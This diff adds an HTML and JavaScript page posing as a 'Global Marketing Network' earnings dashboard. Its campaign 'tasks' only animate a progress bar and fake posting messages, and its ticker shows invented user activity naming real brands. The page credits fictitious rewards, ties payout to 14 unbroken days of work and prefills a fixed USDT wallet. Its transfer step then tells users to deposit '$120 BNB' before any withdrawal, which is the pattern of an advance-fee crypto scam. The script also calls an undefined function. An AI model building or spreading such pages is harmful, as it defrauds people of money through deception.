@@ -1,0 +1,778 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Global Marketing Dashboard</title>
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" rel="stylesheet">
+
+<style>
+
+*{box-sizing:border-box;}
+
+body{
+margin:0;
+font-family:Segoe UI;
+background:linear-gradient(135deg,#020617,#0f172a);
+color:white;
+}
+
+/* dashboard */
+
+.dashboard{
+max-width:1200px;
+margin:auto;
+padding:25px;
+}
+
+/* header */
+
+.header{
+display:flex;
+justify-content:space-between;
+align-items:center;
+margin-bottom:20px;
+}
+
+.header h2{
+font-weight:600;
+}
+
+/* ticker */
+
+.ticker{
+background:#111827;
+padding:10px;
+border-radius:8px;
+overflow:hidden;
+margin-bottom:20px;
+}
+
+.ticker span{
+color:#38bdf8;
+animation:slide 15s linear infinite;
+display:inline-block;
+white-space:nowrap;
+}
+
+@keyframes slide{
+0%{transform:translateX(100%)}
+100%{transform:translateX(-100%)}
+}
+
+/* stats */
+
+.stats{
+display:grid;
+grid-template-columns:repeat(4,1fr);
+gap:20px;
+margin-bottom:20px;
+}
+
+.card{
+background:rgba(255,255,255,0.05);
+border-radius:12px;
+padding:20px;
+border:1px solid rgba(255,255,255,0.1);
+transition:0.3s;
+}
+
+.card:hover{
+transform:translateY(-5px);
+}
+
+.card h3{
+margin:0;
+color:#94a3b8;
+font-size:14px;
+}
+
+.card p{
+font-size:26px;
+margin-top:10px;
+font-weight:bold;
+}
+
+/* buttons */
+
+.btn{
+background:linear-gradient(90deg,#2563eb,#38bdf8);
+border:none;
+padding:12px 22px;
+border-radius:8px;
+color:white;
+cursor:pointer;
+font-weight:600;
+transition:0.3s;
+}
+
+.btn:hover{
+transform:scale(1.05);
+box-shadow:0 0 15px #38bdf8;
+}
+
+.upgrade-btn{
+background:linear-gradient(90deg,#22c55e,#4ade80);
+}
+
+/* boxes */
+
+.task-box,
+.withdraw-box,
+.history-box{
+background:rgba(255,255,255,0.05);
+padding:25px;
+border-radius:12px;
+border:1px solid rgba(255,255,255,0.1);
+margin-bottom:20px;
+}
+
+/* campaign card */
+
+.campaign-card{
+display:flex;
+gap:20px;
+align-items:center;
+background:#0f172a;
+padding:20px;
+border-radius:10px;
+}
+
+.campaign-img{
+width:140px;
+height:90px;
+object-fit:cover;
+border-radius:6px;
+}
+
+.campaign-logo{
+width:40px;
+margin-bottom:8px;
+}
+
+.campaign-info h3{
+margin:5px 0;
+}
+
+/* progress */
+
+.progress-bar{
+width:100%;
+height:10px;
+background:#111827;
+border-radius:10px;
+margin-top:20px;
+overflow:hidden;
+}
+
+#progress{
+height:100%;
+width:0%;
+background:linear-gradient(90deg,#22c55e,#4ade80);
+}
+
+/* popup */
+
+.popup{
+position:fixed;
+top:20px;
+right:20px;
+background:#111827;
+padding:15px 20px;
+border-radius:10px;
+box-shadow:0 0 20px rgba(0,0,0,0.6);
+display:none;
+}
+
+/* forms */
+
+input,select{
+width:100%;
+padding:10px;
+margin-top:10px;
+border:none;
+border-radius:6px;
+}
+
+.hidden{display:none;}
+
+.withdraw-item{
+background:#0f172a;
+padding:10px;
+border-radius:6px;
+margin-top:10px;
+}
+
+/* platform status */
+
+.platform-status{
+margin-top:15px;
+color:#38bdf8;
+font-size:14px;
+}
+
+/* responsive */
+
+@media(max-width:900px){
+
+.stats{
+grid-template-columns:repeat(2,1fr);
+}
+
+.header{
+flex-direction:column;
+gap:15px;
+}
+
+.campaign-card{
+flex-direction:column;
+text-align:center;
+}
+
+.campaign-img{
+width:100%;
+height:160px;
+}
+
+}
+
+@media(max-width:500px){
+
+.stats{
+grid-template-columns:1fr;
+}
+
+.dashboard{
+padding:15px;
+}
+
+.btn{
+width:100%;
+margin-top:10px;
+}
+
+}
+
+</style>
+</head>
+
+<body>
+
+<div class="dashboard">
+
+<div class="header">
+
+<h2><i class="fa-solid fa-chart-line"></i> Global Marketing Network</h2>
+
+<div>
+<button class="btn upgrade-btn" id="upgradeBtn">
+<i class="fa-solid fa-arrow-up"></i> Upgrade
+</button>
+
+<button class="btn" id="activate">
+<i class="fa-solid fa-play"></i> Activate Contract
+</button>
+</div>
+
+</div>
+
+<div class="ticker">
+<span id="tickerText"></span>
+</div>
+
+<div class="stats">
+
+<div class="card">
+<h3>Total Earnings</h3>
+<p>$<span id="earnings">0</span></p>
+</div>
+
+<div class="card">
+<h3>Tasks Completed</h3>
+<p><span id="tasksDone">0</span>/50</p>
+</div>
+
+<div class="card">
+<h3>Contract Status</h3>
+<p id="status">Inactive</p>
+</div>
+
+<div class="card">
+<h3>Membership</h3>
+<p id="membership">Starter</p>
+</div>
+
+</div>
+
+<div class="task-box">
+
+<h3>Daily Promotion Campaign</h3>
+
+<div id="taskArea"></div>
+
+</div>
+
+<div class="withdraw-box">
+
+<h3><i class="fa-solid fa-right-left"></i> Transfer Earnings</h3>
+
+<p style="color:#facc15; font-size:14px;">
+⚠️ Warning: Make sure you complete daily provided tasks without skipping a day in order not to go against task rules.
+</p>
+
+<button class="btn" id="transferToggle">Transfer Funds</button>
+
+<div id="transferForm" class="hidden">
+
+<label>Asset</label>
+<select id="coin">
+<option selected>USDT</option>
+</select>
+
+<label>Wallet Address</label>
+<input id="wallet" readonly>
+
+<label>Amount</label>
+<input id="amount" type="number" readonly>
+
+<button class="btn" id="transferBtn">
+Transfer to Main Dashboard for Withdrawal
+</button>
+
+</div>
+
+</div>
+
+</div>
+
+<div class="history-box">
+
+<h3>Withdrawal History</h3>
+
+<div id="history"></div>
+
+</div>
+
+</div>
+
+<div class="popup" id="popup"></div>
+
+<script>
+
+/* =========================
+   14-DAY CYCLE SYSTEM (ADDED)
+========================= */
+
+let cycles = JSON.parse(localStorage.getItem("cycles")) || []
+
+let currentCycle = cycles.find(c => c.status === "active")
+
+if(!currentCycle){
+currentCycle = {
+days: 0,
+earnings: 0,
+status: "active",
+lastDate: null
+}
+cycles.push(currentCycle)
+}
+
+function saveCycles(){
+localStorage.setItem("cycles", JSON.stringify(cycles))
+}
+
+/* LIVE ACTIVITY TICKER */
+
+const activities = [
+
+"User from USA promoted Spotify campaign",
+"User from Germany completed Tesla marketing",
+"User from Canada finished Binance promotion",
+"User from UK promoted Nike campaign",
+"User from France completed Amazon campaign",
+
+"User from Australia promoted Apple campaign",
+"User from Netherlands completed Adidas promotion",
+"User from Spain promoted Coca-Cola campaign",
+"User from Italy completed Netflix marketing",
+"User from Sweden promoted Samsung campaign",
+
+"User from Brazil finished YouTube promotion",
+"User from Japan promoted PlayStation campaign",
+"User from India completed Microsoft marketing",
+"User from South Africa promoted Uber campaign",
+"User from Mexico completed TikTok promotion",
+
+"User from Belgium promoted PayPal campaign",
+"User from Norway completed Meta marketing",
+"User from Switzerland promoted Google campaign",
+"User from Denmark completed eBay promotion",
+"User from Ireland promoted LinkedIn campaign",
+
+"User from Poland completed Intel marketing",
+"User from Singapore promoted Disney campaign",
+"User from Austria completed Huawei promotion",
+"User from Finland promoted Airbnb campaign",
+"User from Portugal completed Reddit marketing",
+
+"User from Argentina promoted Snapchat campaign",
+"User from Malaysia completed Telegram promotion",
+"User from Thailand promoted Netflix campaign",
+"User from Indonesia completed Spotify marketing",
+"User from Turkey promoted Amazon campaign"
+
+];
+
+function ticker(){
+let msg=activities[Math.floor(Math.random()*activities.length)]
+document.getElementById("tickerText").innerText=msg
+}
+
+setInterval(ticker,4000)
+ticker()
+
+/* popup */
+
+function popup(text){
+
+let p=document.getElementById("popup")
+
+p.innerText=text
+p.style.display="block"
+
+setTimeout(()=>{
+p.style.display="none"
+},3000)
+
+}
+
+/* task engine */
+
+let earnings = Number(localStorage.getItem("earnings")) || 0
+let tasks = JSON.parse(localStorage.getItem("tasks")) || []
+let last = Number(localStorage.getItem("last")) || 0
+
+const earningsEl = document.getElementById("earnings")
+const tasksEl = document.getElementById("tasksDone")
+const status = document.getElementById("status")
+const taskArea = document.getElementById("taskArea")
+
+earningsEl.innerText = earnings.toFixed(2)
+
+/* campaigns */
+
+const campaigns = [
+
+{ name:"Apple iPhone Ads", logo:"https://logo.clearbit.com/apple.com", image:"https://images.unsplash.com/photo-1510557880182-3c9eaaee2a3d" },
+{ name:"Samsung Galaxy Promotion", logo:"https://logo.clearbit.com/samsung.com", image:"https://images.unsplash.com/photo-1511707171634-5f897ff02aa9" },
+{ name:"Microsoft Cloud Campaign", logo:"https://logo.clearbit.com/microsoft.com", image:"https://images.unsplash.com/photo-1537432376769-00aabc3a7b93" },
+{ name:"eBay Sales Campaign", logo:"https://logo.clearbit.com/ebay.com", image:"https://images.unsplash.com/photo-1556740738-b6a63e27c4df" },
+{ name:"Alibaba Product Boost", logo:"https://logo.clearbit.com/alibaba.com", image:"https://images.unsplash.com/photo-1522199710521-72d69614c702" },
+{ name:"PayPal Payment Ads", logo:"https://logo.clearbit.com/paypal.com", image:"https://images.unsplash.com/photo-1556742049-0cfed4f6a45d" },
+{ name:"Visa Global Campaign", logo:"https://logo.clearbit.com/visa.com", image:"https://images.unsplash.com/photo-1580519542036-c47de6196ba5" },
+{ name:"McDonald's Promo Ads", logo:"https://logo.clearbit.com/mcdonalds.com", image:"https://images.unsplash.com/photo-1550547660-d9450f859349" },
+{ name:"Coca-Cola Awareness", logo:"https://logo.clearbit.com/coca-cola.com", image:"https://images.unsplash.com/photo-1580910051074-3eb694886505" },
+{ name:"Airbnb Travel Campaign", logo:"https://logo.clearbit.com/airbnb.com", image:"https://images.unsplash.com/photo-1502920917128-1aa500764cbd" },
+{ name:"Booking.com Ads", logo:"https://logo.clearbit.com/booking.com", image:"https://images.unsplash.com/photo-1566073771259-6a8506099945" },
+{ name:"TikTok Promotion", logo:"https://logo.clearbit.com/tiktok.com", image:"https://images.unsplash.com/photo-1611605698323-b1e99cfd37ea" },
+{ name:"YouTube Creator Ads", logo:"https://logo.clearbit.com/youtube.com", image:"https://images.unsplash.com/photo-1581091012184-5c4c2dcd2c58" }
+
+]
+
+function shuffle(array) {
+return array.sort(() => Math.random() - 0.5)
+}
+
+const actions = ["Boost", "Awareness", "Engagement", "Traffic", "Conversion"]
+const channels = ["Global", "Regional", "Mobile", "Influencer", "AI Targeted"]
+
+function generateDynamicName(base){
+let a = actions[Math.floor(Math.random()*actions.length)]
+let c = channels[Math.floor(Math.random()*channels.length)]
+return base + " " + a + " - " + c
+}
+
+function generateTasks(){
+
+let shuffled = shuffle([...campaigns])
+let arr = []
+
+for(let i=0;i<50;i++){
+
+let c = shuffled[i % shuffled.length]
+let price = (Math.random()*(5-2)+2).toFixed(2)
+
+arr.push({
+name: generateDynamicName(c.name),
+price:price,
+logo:c.logo,
+image:c.image,
+status:"pending"
+})
+
+}
+
+return arr
+
+}
+
+/* activate */
+
+document.getElementById("activate").onclick=()=>{
+
+let now=Date.now()
+
+if(tasks.length>0){
+popup("You still have active tasks to complete")
+return
+}
+
+if(last && now-last<86400000){
+popup("New tasks available after 24 hours")
+return
+}
+
+tasks = generateTasks()
+
+localStorage.setItem("tasks",JSON.stringify(tasks))
+localStorage.setItem("last",now)
+
+status.innerText="Active"
+
+renderTasks()
+
+popup("50 Campaign Tasks Generated")
+
+}
+
+/* render tasks */
+
+function renderTasks(){
+
+let completed = tasks.filter(t=>t.status==="done").length
+
+tasksEl.innerText = completed + "/50"
+
+if(completed>=50){
+
+taskArea.innerHTML="<h3>All 50 Tasks Completed ✔</h3>"
+
+status.innerText="Completed"
+
+localStorage.removeItem("tasks")
+
+return
+}
+
+let html=""
+
+tasks.forEach((t,i)=>{
+
+if(t.status==="pending"){
+
+html+=`
+
+<div class="campaign-card">
+<img class="campaign-img" src="${t.image}">
+<div class="campaign-info">
+<img class="campaign-logo" src="${t.logo}">
+<h3>${t.name}</h3>
+<p>Reward: $${t.price}</p>
+<button class="btn" onclick="startTask(${i})">Launch Campaign</button>
+</div>
+</div>
+
+`
+
+}
+
+})
+
+taskArea.innerHTML=html
+
+}
+
+/* start task */
+
+function startTask(index){
+
+taskArea.innerHTML=`
+
+<p>Deploying Marketing Campaign...</p>
+
+<div class="progress-bar">
+<div id="progress"></div>
+</div>
+
+<div class="platform-status" id="platformStatus"></div>
+
+`
+
+let updates=[
+"🐦 Published to Twitter",
+"💼 Published to LinkedIn",
+"📘 Posted to Facebook",
+"📸 Posted to Instagram",
+"🌍 Broadcast to 45 Ad Platforms",
+"🔍 Google SEO signals updated",
+"📢 Marketing bots distributing content",
+"🚀 Traffic campaign launched"
+]
+
+let statusEl=document.getElementById("platformStatus")
+let p=document.getElementById("progress")
+
+let w=0
+
+let updateLoop=setInterval(()=>{
+statusEl.innerText=updates[Math.floor(Math.random()*updates.length)]
+},1000)
+
+let interval=setInterval(()=>{
+
+w+=2
+p.style.width=w+"%"
+
+if(w>=100){
+
+clearInterval(interval)
+clearInterval(updateLoop)
+
+finishTask(index)
+
+}
+
+},100)
+
+}
+
+/* finish task (UPGRADED, NOT REMOVED) */
+
+function finishTask(index){
+
+let t=tasks[index]
+
+earnings += Number(t.price)
+currentCycle.earnings += Number(t.price)
+
+t.status="done"
+
+localStorage.setItem("tasks",JSON.stringify(tasks))
+localStorage.setItem("earnings",earnings)
+
+earningsEl.innerText=earnings.toFixed(2)
+
+popup("Task Completed +$"+t.price)
+
+/* cycle logic added */
+let completed = tasks.filter(t=>t.status==="done").length
+
+if(completed === 50){
+
+let today = new Date().toDateString()
+
+if(currentCycle.lastDate){
+
+let yesterday = new Date()
+yesterday.setDate(yesterday.getDate()-1)
+
+if(new Date(currentCycle.lastDate).toDateString() !== yesterday.toDateString()){
+currentCycle.days = 0
+currentCycle.earnings = 0
+}
+}
+
+currentCycle.days++
+currentCycle.lastDate = today
+
+if(currentCycle.days >= 14){
+
+currentCycle.status = "completed"
+currentCycle.completedDate = new Date().toISOString()
+
+saveCycles()
+
+/* AUTO PREPARE TRANSFER DATA */
+
+let withdrawable = cycles
+.filter(c => c.status === "completed")
+.reduce((sum,c)=>sum+c.earnings,0)
+
+localStorage.setItem("withdrawableAmount", withdrawable)
+
+/* Start new cycle */
+
+currentCycle = {
+days:0,
+earnings:0,
+status:"active",
+lastDate:null
+}
+
+cycles.push(currentCycle)
+
+popup("🎉 14-Day Cycle Completed! Funds ready for transfer.")
+
+}
+
+saveCycles()
+}
+
+renderTasks()
+
+}
+
+/* load existing tasks */
+
+if(tasks.length>0){
+status.innerText="Active"
+renderTasks()
+}
+
+/* =========================
+   TRANSFER SYSTEM (REPLACES WITHDRAW)
+========================= */
+document.getElementById("transferToggle").onclick = () => {
+
+document.getElementById("transferForm").classList.toggle("hidden")
+
+document.getElementById("coin").value = "USDT"
+
+/* AUTO WALLET */
+document.getElementById("wallet").value = "TX7CpBYg8Gph7A4T2EqyS586qaMYENDteL"
+
+/* AUTO AMOUNT AFTER 14 DAYS */
+
+let withdrawable = Number(localStorage.getItem("withdrawableAmount")) || 0
+
+document.getElementById("amount").value = withdrawable.toFixed(2)
+
+}
+
+let transferMessage = "Congratulations! You can now transfer your funds to your main dashboard for withdrawal to your preferred wallet or exchange. USDT transfers use the Bep20 network and the transfer fee is $120 BNB, you are requred to deposit $120 BNB to your BNB address on your main dashboard before your transfer can be processed ."
+
+document.getElementById("transferBtn").onclick = () => {
+
+let withdrawable = Number(localStorage.getItem("withdrawableAmount")) || 0
+
+if(withdrawable <= 0){
+popup("No completed 14-day cycle yet.")
+return
+}
+popup("🎉 Congratulations!")
+
+let div=document.createElement("div")
+div.className="withdraw-item"
+div.innerText = "Eligible Balance: $" + withdrawable.toFixed(2) + " • " + transferMessage
+
+document.getElementById("history").prepend(div)
+
+}
+/* upgrade */
+
+document.getElementById("upgradeBtn").onclick=()=>{
+popup("Upgrade to Premium to unlock higher paying campaigns")
+}
+setInterval(check14DayCycle, 5000) // check every 5 seconds
+check14DayCycle()
+</script>
